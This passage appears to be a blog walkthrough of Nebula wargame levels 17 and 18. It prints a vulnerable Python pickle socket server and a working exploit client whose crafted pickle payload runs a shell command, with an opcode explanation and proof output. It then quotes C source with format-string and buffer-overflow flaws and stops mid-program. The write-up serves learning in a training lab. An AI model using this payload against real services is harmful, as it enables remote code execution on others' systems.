&lt;h2 id=&#34;level-17:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 17&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;os&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pickle&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;time&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;signal&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;signal&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;signal(signal&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SIGCHLD,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;signal&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SIG_IGN)&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;server&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(skt):&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pickle&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;loads(line)&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;obj:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;clnt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;why did you send me &amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;?&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;bind((&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10007&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;listen(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;True:&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;clnt,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;addr&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;accept()&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(os&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fork()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;clnt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Accepted connection from %s:%d&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(addr[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;addr[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]))&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;server(clnt)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Here &lt;code&gt;pickle&lt;/code&gt; provides us with the possibility of an exploit to run our own code. There&amp;rsquo;s lots to read on the security issues with &lt;code&gt;pickle&lt;/code&gt;, but to be fair it was never meant to be secure in itself. &lt;a href=&#34;https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf&#34;&gt;BH_US_11_Slaviero_Sour_Pickles_WP.pdf&lt;/a&gt; and &lt;a href=&#34;https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf&#34;&gt;BH_US_11_Slaviero_Sour_Pickles_Slides.pdf&lt;/a&gt; are a good source for more info.&lt;/p&gt;

&lt;p&gt;Right, so my plan is to get a shell as &lt;em&gt;flag17&lt;/em&gt; and get the flag from there. Using pickle&amp;rsquo;s opcodes I can construct a string that will run &lt;code&gt;getflag&lt;/code&gt; from the &lt;code&gt;pickle.loads&lt;/code&gt; call as user &lt;em&gt;flag17&lt;/em&gt;. So before I started constructing this I copied the script and ran it as &lt;em&gt;level17&lt;/em&gt; on a different port in order to debug and see what&amp;rsquo;s going on. Once I was happy with my exploit code I changed the port to &lt;code&gt;10007&lt;/code&gt; and ran it to get the flag.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/bin/python&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;connect((&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10007&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;sent&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;cos&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;(S&amp;#39;/bin/bash -c /bin/getflag &amp;gt; /tmp/f17pwned&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;tR&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sent&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;skt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll explain the pickle string a bit:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cos\nsystem&lt;/code&gt; resolves the classname and calls it&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&lt;/code&gt; is the marker&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S&#39;/bin/bash -c /bin/getflag &amp;gt; /tmp/f17pwned&#39;\n&lt;/code&gt; this is our command we want to run&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tR\n&lt;/code&gt; - &lt;code&gt;t&lt;/code&gt; puts the string onto the stack and &lt;code&gt;R&lt;/code&gt; pops this tuple and calls it, thus executing our lovingly crafted payload.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Once run it looks like it worked so let&amp;rsquo;s be sure&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level17@nebula:/tmp/flag17$ cat ../f17pwned
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-18:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 18&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;getopt.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;FILE&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;debugfile;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;verbose;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;loggedin;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define dprintf(...) if(globals.debugfile) \&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;  fprintf(globals.debugfile, __VA_ARGS__)&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;  fprintf(globals.debugfile, __VA_ARGS__)&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define PWFILE &amp;quot;/home/flag18/password&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;login&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pw)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;FILE&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fopen(PWFILE,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fp)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fgets(file,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(file)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fp)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;dprintf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to read password file %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;PWFILE);&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;fclose(fp);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strcmp(pw,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;    
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;dprintf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;logged in successfully (with%s password file)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; 
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;out&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.loggedin&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;notsupported&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;what)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;asprintf(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;--&amp;gt; [%s] is unsupported at this current time.&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;what);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;dprintf(what);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;free(buffer);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;setuser&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;user)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;msg[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;sprintf(msg,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;unable to set user to &amp;#39;%s&amp;#39; -- not supported.&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;user);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;msg);&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c;&lt;/span&gt;

